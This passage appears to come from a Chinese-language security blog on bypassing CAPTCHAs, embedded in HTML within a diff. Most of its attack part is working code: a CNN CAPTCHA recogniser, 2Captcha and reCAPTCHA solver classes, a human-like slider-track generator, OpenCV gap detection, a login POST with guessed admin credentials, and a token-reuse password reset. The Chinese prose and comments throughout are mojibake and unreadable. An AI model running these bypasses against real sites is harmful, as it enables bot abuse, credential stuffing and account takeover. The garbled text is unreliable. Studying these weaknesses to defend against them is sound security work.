class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;浣跨敤 CNN 璁粌楠岃瘉鐮佽瘑鍒ā鍨嬶紙绠€鍖栫増锛?&quot;&quot;</span></span><br><span class="line"><span class="string">import tensorflow as tf</span></span><br><span class="line"><span class="string">from tensorflow import keras</span></span><br><span class="line"><span class="string">from tensorflow.keras import layers</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def build_captcha_model(height=60, width=160, num_chars=4, char_set_size=36):</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>鏋勫缓楠岃瘉鐮佽瘑鍒?CNN 妯″瀷<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    input_layer = keras.Input(shape=(height, width, 1))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 鍗风Н灞?    x = layers.Conv2D(32, (3, 3), activation=&#x27;relu&#x27;, padding=&#x27;same&#x27;)(input_layer)</span></span><br><span class="line"><span class="string">    x = layers.MaxPooling2D((2, 2))(x)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    x = layers.Conv2D(64, (3, 3), activation=&#x27;relu&#x27;, padding=&#x27;same&#x27;)(x)</span></span><br><span class="line"><span class="string">    x = layers.MaxPooling2D((2, 2))(x)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    x = layers.Conv2D(128, (3, 3), activation=&#x27;relu&#x27;, padding=&#x27;same&#x27;)(x)</span></span><br><span class="line"><span class="string">    x = layers.MaxPooling2D((2, 2))(x)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 鍏ㄨ繛鎺ュ眰</span></span><br><span class="line"><span class="string">    x = layers.Flatten()(x)</span></span><br><span class="line"><span class="string">    x = layers.Dropout(0.5)(x)</span></span><br><span class="line"><span class="string">    x = layers.Dense(512, activation=&#x27;relu&#x27;)(x)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 杈撳嚭灞傦紙姣忎釜瀛楃涓€涓垎绫昏緭鍑猴級</span></span><br><span class="line"><span class="string">    outputs = []</span></span><br><span class="line"><span class="string">    for i in range(num_chars):</span></span><br><span class="line"><span class="string">        outputs.append(layers.Dense(char_set_size, activation=&#x27;softmax&#x27;, name=f&#x27;char_&#123;i&#125;&#x27;)(x))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    model = keras.Model(inputs=input_layer, outputs=outputs)</span></span><br><span class="line"><span class="string">    model.compile(</span></span><br><span class="line"><span class="string">        optimizer=&#x27;adam&#x27;,</span></span><br><span class="line"><span class="string">        loss=&#x27;sparse_categorical_crossentropy&#x27;,</span></span><br><span class="line"><span class="string">        metrics=[&#x27;accuracy&#x27;]</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    return model</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鏋勫缓妯″瀷</span></span><br><span class="line"><span class="string">model = build_captcha_model()</span></span><br><span class="line"><span class="string">model.summary()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 璁粌锛堥渶瑕佸噯澶囨暟鎹泦锛?# model.fit(x_train, y_train, epochs=50, batch_size=64, validation_split=0.2)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-鎵撶爜骞冲彴鎺ュ叆"><a href="#5-4-鎵撶爜骞冲彴鎺ュ叆" class="headerlink" title="5.4 鎵撶爜骞冲彴鎺ュ叆"></a>5.4 鎵撶爜骞冲彴鎺ュ叆</h3><p>瀵逛簬澶嶆潅鐨勯獙璇佺爜锛堝鏋侀獙銆乺eCAPTCHA锛夛紝鐩存帴浣跨敤鎵撶爜骞冲彴鏄渶渚挎嵎鐨勬柟寮忋€?</p>
+<table>
+<thead>
+<tr>
+<th align="left">骞冲彴</th>
+<th align="left">鏀寔绫诲瀷</th>
+<th align="left">浠锋牸</th>
+<th align="left">API 鏂瑰紡</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>2Captcha</strong></td>
+<td align="left">reCAPTCHA v2&#x2F;v3, 鏋侀獙, 鍥惧舰, 婊戝潡</td>
+<td align="left">~$3&#x2F;1000 娆?</td>
+<td align="left">HTTP API</td>
+</tr>
+<tr>
+<td align="left">*<em>鎵撶爜鍏?</em></td>
+<td align="left">鍥惧舰楠岃瘉鐮? 婊戝潡</td>
+<td align="left">鎸夐噺璁¤垂</td>
+<td align="left">HTTP API</td>
+</tr>
+<tr>
+<td align="left"><strong>瓒呬汉鎵撶爜</strong></td>
+<td align="left">鍥惧舰楠岃瘉鐮? reCAPTCHA</td>
+<td align="left">鎸夐噺璁¤垂</td>
+<td align="left">HTTP API</td>
+</tr>
+<tr>
+<td align="left"><strong>鏁扮編鎵撶爜</strong></td>
+<td align="left">鍥惧舰楠岃瘉鐮? 鏋侀獙</td>
+<td align="left">鎸夐噺璁¤垂</td>
+<td align="left">HTTP API</td>
+</tr>
+<tr>
+<td align="left"><strong>EzCaptcha</strong></td>
+<td align="left">reCAPTCHA, 鏋侀獙, 婊戝潡</td>
+<td align="left">鎸夐噺璁¤垂</td>
+<td align="left">HTTP API + SDK</td>
+</tr>
+</tbody></table>
+<p><strong>2Captcha 鎺ュ叆绀轰緥</strong>锛?&#96;&#96;&#96;python<br>#!&#x2F;usr&#x2F;bin&#x2F;env python3<br>“””2Captcha API 鎺ュ叆绀轰緥”””<br>import requests<br>import time</p>
+<p>class CaptchaSolver:<br>    def <strong>init</strong>(self, api_key):<br>        self.api_key &#x3D; api_key<br>        self.base_url &#x3D; “<a target="_blank" rel="noopener" href="https://2captcha.com/">https://2captcha.com</a>“</p>
+<pre><code>def solve_recaptcha_v2(self, site_key, page_url):
+    &quot;&quot;&quot;瑙ｅ喅 reCAPTCHA v2&quot;&quot;&quot;
+    # 鎻愪氦浠诲姟
+    resp = requests.post(f&quot;&#123;self.base_url&#125;/in.php&quot;, data=&#123;
+        &quot;key&quot;: self.api_key,
+        &quot;method&quot;: &quot;userrecaptcha&quot;,
+        &quot;googlekey&quot;: site_key,
+        &quot;pageurl&quot;: page_url,
+        &quot;json&quot;: 1
+    &#125;)
+    task_id = resp.json().get(&quot;request&quot;)
+    
+    # 杞鑾峰彇缁撴灉
+    for _ in range(60):
+        time.sleep(5)
+        result = requests.get(f&quot;&#123;self.base_url&#125;/res.php&quot;, params=&#123;
+            &quot;key&quot;: self.api_key,
+            &quot;action&quot;: &quot;get&quot;,
+            &quot;id&quot;: task_id,
+            &quot;json&quot;: 1
+        &#125;)
+        if result.json().get(&quot;status&quot;) == 1:
+            return result.json().get(&quot;request&quot;)
+    return None
+
+def solve_image_captcha(self, image_path):
+    &quot;&quot;&quot;瑙ｅ喅鍥惧舰楠岃瘉鐮?&quot;&quot;
+    with open(image_path, &#39;rb&#39;) as f:
+        resp = requests.post(f&quot;&#123;self.base_url&#125;/in.php&quot;, data=&#123;
+            &quot;key&quot;: self.api_key,
+            &quot;method&quot;: &quot;post&quot;,
+            &quot;json&quot;: 1
+        &#125;, files=&#123;&quot;file&quot;: f&#125;)
+        task_id = resp.json().get(&quot;request&quot;)
+    
+    for _ in range(30):
+        time.sleep(3)
+        result = requests.get(f&quot;&#123;self.base_url&#125;/res.php&quot;, params=&#123;
+            &quot;key&quot;: self.api_key,
+            &quot;action&quot;: &quot;get&quot;,
+            &quot;id&quot;: task_id,
+            &quot;json&quot;: 1
+        &#125;)
+        if result.json().get(&quot;status&quot;) == 1:
+            return result.json().get(&quot;request&quot;)
+    return None
+</code></pre>
+<h1 id="浣跨敤-1"><a href="#浣跨敤-1" class="headerlink" title="浣跨敤"></a>浣跨敤</h1><p>solver &#x3D; CaptchaSolver(“YOUR_API_KEY”)<br>token &#x3D; solver.solve_recaptcha_v2(“site_key”, “<a target="_blank" rel="noopener" href="https://target.com/">https://target.com</a>“)<br>print(f”reCAPTCHA Token: {token}”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 鍏€侀珮绾ч獙璇佺爜缁曡繃</span><br><span class="line"></span><br><span class="line">### 6.1 婊戝潡楠岃瘉鐮佺粫杩?</span><br><span class="line">**婊戝潡楠岃瘉鐮?*锛堝鏋侀獙 Geetest銆侀樋閲屼簯婊戝潡锛夋槸鐩墠鏈€娴佽鐨勯獙璇佺爜绫诲瀷锛岀粫杩囨柟寮忓寘鎷細</span><br><span class="line"></span><br><span class="line">**鏂规硶涓€锛氳建杩规ā鎷?*</span><br><span class="line">```python</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot;婊戝潡楠岃瘉鐮佽建杩规ā鎷?&quot;&quot;</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def generate_track(distance):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    鐢熸垚浜虹被鍖栫殑榧犳爣鎷栧姩杞ㄨ抗</span><br><span class="line">    distance: 鎷煎浘闇€瑕佺Щ鍔ㄧ殑璺濈锛堝儚绱狅級</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    track = []</span><br><span class="line">    current = 0</span><br><span class="line">    mid = distance * 3 / 4</span><br><span class="line">    t = 0.2</span><br><span class="line">    </span><br><span class="line">    while current &lt; distance:</span><br><span class="line">        if current &lt; mid:</span><br><span class="line">            # 鍔犻€熼樁娈?            speed = random.uniform(2, 4)</span><br><span class="line">        else:</span><br><span class="line">            # 鍑忛€熼樁娈碉紙鎺ヨ繎鐩爣鏃舵斁鎱級</span><br><span class="line">            speed = random.uniform(0.5, 2)</span><br><span class="line">        </span><br><span class="line">        current += speed</span><br><span class="line">        t += 0.01 + random.uniform(0, 0.02)</span><br><span class="line">        track.append(&#123;</span><br><span class="line">            &quot;x&quot;: round(current, 2),</span><br><span class="line">            &quot;y&quot;: random.uniform(-2, 2),  # 寰皬鐨?Y 杞存姈鍔?            &quot;t&quot;: round(t * 1000)  # 鏃堕棿鎴筹紙姣锛?        &#125;)</span><br><span class="line">    </span><br><span class="line">    # 缁堢偣寰皟</span><br><span class="line">    track.append(&#123;</span><br><span class="line">        &quot;x&quot;: round(distance, 2),</span><br><span class="line">        &quot;y&quot;: 0,</span><br><span class="line">        &quot;t&quot;: round(t * 1000) + random.randint(50, 150)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    return track</span><br><span class="line"></span><br><span class="line"># 鐢熸垚杞ㄨ抗</span><br><span class="line">track = generate_track(258)  # 鍋囪闇€瑕佺Щ鍔?258 鍍忕礌</span><br><span class="line">print(track)</span><br></pre></td></tr></table></figure>
+
+<p><strong>鏂规硶浜岋細缂哄彛璇嗗埆锛堟繁搴﹀涔狅級</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;浣跨敤娣卞害瀛︿範璇嗗埆婊戝潡楠岃瘉鐮佺己鍙ｄ綅缃?&quot;&quot;</span></span><br><span class="line"><span class="string">import cv2</span></span><br><span class="line"><span class="string">import numpy as np</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def find_gap(bg_path, slice_path):</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    璇嗗埆婊戝潡楠岃瘉鐮佺殑缂哄彛浣嶇疆</span><br><span class="line">    bg_path: 甯︾己鍙ｇ殑鑳屾櫙鍥捐矾寰?    slice_path: 婊戝潡鎷煎浘璺緞</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    bg = cv2.imread(bg_path, 0)</span></span><br><span class="line"><span class="string">    slice_img = cv2.imread(slice_path, 0)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 杈圭紭妫€娴?    bg_edges = cv2.Canny(bg, 100, 200)</span></span><br><span class="line"><span class="string">    slice_edges = cv2.Canny(slice_img, 100, 200)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 妯℃澘鍖归厤</span></span><br><span class="line"><span class="string">    result = cv2.matchTemplate(bg_edges, slice_edges, cv2.TM_CCOEFF_NORMED)</span></span><br><span class="line"><span class="string">    _, _, _, max_loc = cv2.minMaxLoc(result)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    x, y = max_loc</span></span><br><span class="line"><span class="string">    return x, y  # 缂哄彛宸︿笂瑙掑潗鏍?</span></span><br><span class="line"><span class="string"># 浣跨敤</span></span><br><span class="line"><span class="string">x, y = find_gap(&#x27;captcha_bg.png&#x27;, &#x27;captcha_slice.png&#x27;)</span></span><br><span class="line"><span class="string">print(f&quot;缂哄彛浣嶇疆: (&#123;x&#125;, &#123;y&#125;)&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>鏂规硶涓夛細鏋侀獙 API 閫嗗悜</strong></p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 鏋侀獙 Geetest 楠岃瘉鐮侀€嗗悜鍏抽敭鐐?// 1. 鑾峰彇 gt 鍜?challenge 鍙傛暟</span></span><br><span class="line"><span class="comment">// 2. 鍒嗘瀽 w 鍙傛暟鐢熸垚绠楁硶锛堟牳蹇冿級</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 鍓嶇閫嗗悜鑾峰彇 w 鍙傛暟鐢熸垚閫昏緫</span></span><br><span class="line"><span class="comment">// w = captcha_id + challenge + userresponse + passtime + imgload + aa + ep + rp + ...</span></span><br><span class="line"><span class="comment">// 鍏朵腑 userresponse = 鍔犲瘑鍚庣殑婊戝姩璺濈</span></span><br><span class="line"><span class="comment">// passtime = 浜虹被鎿嶄綔鐨勬绉掓暟</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-reCAPTCHA-缁曡繃"><a href="#6-2-reCAPTCHA-缁曡繃" class="headerlink" title="6.2 reCAPTCHA 缁曡繃"></a>6.2 reCAPTCHA 缁曡繃</h3><p>reCAPTCHA v3 浣跨敤<strong>鏃犳劅璇勫垎鏈哄埗</strong>锛?.0 ~ 1.0锛夛紝鍒嗘暟浣庝簬闃堝€兼椂瑙﹀彂楠岃瘉銆?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;reCAPTCHA 缁曡繃鏈嶅姟鎺ュ叆&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RecaptchaBypass</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    閫氳繃鎵撶爜骞冲彴缁曡繃 reCAPTCHA</span></span><br><span class="line"><span class="string">    鏀寔 reCAPTCHA v2 (checkbox/invisible) 鍜?v3</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, api_key, service=<span class="string">&quot;2captcha&quot;</span></span>):</span><br><span class="line">        self.api_key = api_key</span><br><span class="line">        self.service = service</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solve_v2</span>(<span class="params">self, site_key, page_url</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;瑙ｅ喅 reCAPTCHA v2&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&quot;2captcha&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self._solve_2captcha(site_key, page_url)</span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&quot;capsolver&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self._solve_capsolver(site_key, page_url)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_solve_2captcha</span>(<span class="params">self, site_key, page_url</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;2Captcha 鎺ュ叆&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 鎻愪氦浠诲姟</span></span><br><span class="line">        resp = requests.post(<span class="string">&quot;https://2captcha.com/in.php&quot;</span>, data=&#123;</span><br><span class="line">            <span class="string">&quot;key&quot;</span>: self.api_key,</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;userrecaptcha&quot;</span>,</span><br><span class="line">            <span class="string">&quot;googlekey&quot;</span>: site_key,</span><br><span class="line">            <span class="string">&quot;pageurl&quot;</span>: page_url,</span><br><span class="line">            <span class="string">&quot;json&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;)</span><br><span class="line">        task_id = resp.json().get(<span class="string">&quot;request&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 绛夊緟缁撴灉</span></span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            resp = requests.get(<span class="string">&quot;https://2captcha.com/res.php&quot;</span>, params=&#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: self.api_key,</span><br><span class="line">                <span class="string">&quot;action&quot;</span>: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: task_id,</span><br><span class="line">                <span class="string">&quot;json&quot;</span>: <span class="number">1</span></span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">if</span> resp.json().get(<span class="string">&quot;status&quot;</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> resp.json().get(<span class="string">&quot;request&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浣跨敤</span></span><br><span class="line">bypass = RecaptchaBypass(<span class="string">&quot;YOUR_API_KEY&quot;</span>)</span><br><span class="line">token = bypass.solve_v2(<span class="string">&quot;6Lc...&quot;</span>, <span class="string">&quot;https://target.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;reCAPTCHA Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浣跨敤 token 鎻愪氦琛ㄥ崟</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;https://target.com/login&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g-recaptcha-response&quot;</span>: token</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-楠岃瘉鐮-Token-娉勯湶"><a href="#6-3-楠岃瘉鐮-Token-娉勯湶" class="headerlink" title="6.3 楠岃瘉鐮?Token 娉勯湶"></a>6.3 楠岃瘉鐮?Token 娉勯湶</h3><p><strong>婕忔礊鍘熺悊</strong>锛氶獙璇佺爜鐨勯獙璇佺粨鏋滈€氳繃 Token 杩斿洖锛岃 Token 鍦ㄥ墠绔簮鐮佹垨鍝嶅簲涓彲鑾峰彇銆?</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 鎯呭喌 1: Token 鍦?HTML 婧愮爜涓?--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;captcha_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;VERIFIED_TOKEN_ABCDEF123&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 鎯呭喌 2: Token 鍦?JavaScript 鍙橀噺涓?--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> captchaPassed = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> captchaToken = <span class="string">&quot;1234567890abcdef&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 鎯呭喌 3: Token 鍦?Ajax 鍝嶅簲涓?--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/verify_captcha?code=ABCD&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// data.token = &quot;SUCCESS_TOKEN_XYZ&quot;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;captcha_token&#x27;</span>).<span class="property">value</span> = data.<span class="property">token</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>鍒╃敤鏂瑰紡</strong>锛?1. 鎵嬪姩杈撳叆楠岃瘉鐮侊紝绗竴娆￠€氳繃楠岃瘉<br>2. 浠庨〉闈腑鎻愬彇楠岃瘉閫氳繃鐨?Token<br>3. 鍦ㄥ叾浠栬姹備腑澶嶇敤璇?Token<br>4. 閰嶅悎 BurpSuite Repeater 鎵归噺浣跨敤</p>
+<h3 id="6-4-楠岃瘉鐮佷笌涓氬姟瑙h€"><a href="#6-4-楠岃瘉鐮佷笌涓氬姟瑙h€" class="headerlink" title="6.4 楠岃瘉鐮佷笌涓氬姟瑙ｈ€?"></a>6.4 楠岃瘉鐮佷笌涓氬姟瑙ｈ€?</h3><p><strong>婕忔礊鍘熺悊</strong>锛氶獙璇佺爜楠岃瘉鍜屼笟鍔℃搷浣滃垎涓轰袱涓嫭绔嬬殑璇锋眰锛屼絾涓棿娌℃湁浼氳瘽缁戝畾锛屾敾鍑昏€呭彲浠ュ垎绂讳袱鑰呫€?</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Step 1: 楠岃瘉鐮侀獙璇侊紙鐙珛璇锋眰锛岃繑鍥?token锛?POST /api/verify_captcha HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;: &quot;ABCD&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 鍝嶅簲</span><br><span class="line">&#123;&quot;success&quot;: true, &quot;token&quot;: &quot;captcha_token_123456&quot;&#125;</span><br><span class="line"></span><br><span class="line"># Step 2: 涓氬姟鎿嶄綔锛堜娇鐢ㄤ笂涓€姝ョ殑 token锛?POST /api/reset_password HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;phone&quot;: &quot;13900000000&quot;, &quot;captcha_token&quot;: &quot;captcha_token_123456&quot;, &quot;new_password&quot;: &quot;hacked&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 婕忔礊锛歵oken 鍙鐢紝涓旀湭缁戝畾鍒扮壒瀹氭墜鏈哄彿</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰"><a href="#涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰" class="headerlink" title="涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰"></a>涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰</h2><h3 id="7-1-楠岃瘉鐮佹壂鎻忓伐鍏"><a href="#7-1-楠岃瘉鐮佹壂鎻忓伐鍏" class="headerlink" title="7.1 楠岃瘉鐮佹壂鎻忓伐鍏?"></a>7.1 楠岃瘉鐮佹壂鎻忓伐鍏?</h3><table>
+<thead>
+<tr>
+<th align="left">宸ュ叿</th>
+<th align="left">鐢ㄩ€?</th>
+<th align="left">鍦板潃</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>BurpSuite + Captcha-Killer</strong></td>
+<td align="left">BurpSuite 楠岃瘉鐮佽瘑鍒彃浠?</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer">GitHub: c0ny1&#x2F;captcha-killer</a></td>
+</tr>
+<tr>
+<td align="left"><strong>BurpSuite + captcha-killer-modified</strong></td>
+<td align="left">鏀硅繘鐗堥獙璇佺爜璇嗗埆鎻掍欢</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/f0ng/captcha-killer-modified">GitHub: f0ng&#x2F;captcha-killer-modified</a></td>
+</tr>
+<tr>
+<td align="left"><strong>Tesseract OCR</strong></td>
+<td align="left">寮€婧?OCR 寮曟搸</td>
